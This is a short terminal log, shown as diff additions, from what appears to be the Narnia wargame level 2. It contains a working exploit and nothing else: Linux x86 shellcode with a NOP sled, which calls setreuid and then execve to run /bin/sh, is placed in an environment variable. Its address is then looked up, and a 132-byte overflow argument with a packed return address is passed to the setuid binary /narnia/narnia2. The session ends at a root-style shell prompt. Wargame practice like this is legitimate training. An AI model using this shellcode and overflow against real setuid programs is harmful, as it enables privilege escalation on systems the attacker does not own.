@@ -1,0 +1,10 @@
+narnia2@gibson:/tmp/tmp.PEuLT8ZtFD$ export SHELLCODE=$(python3 -c "import sys;
+sys.stdout.buffer.write(b'\x90'*500+b'\x6a\x31\x58\xcd\x80\x89\xc3\x89\xd9\x6a\x46\x58\xcd\x80\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80')")
+narnia2@gibson:/tmp/tmp.PEuLT8ZtFD$ ./get_address SHELLCODE
+name of var is: SHELLCODE
+address is 0xffffd5cb
+narnia2@gibson:/tmp/tmp.PEuLT8ZtFD$ /narnia/narnia2 $(python3 -c "import sys,
+struct; sys.stdout.buffer.write(b'a'*128+b'b'*4+struct.pack('<I',
+0xffffd5d0))")
+$
+
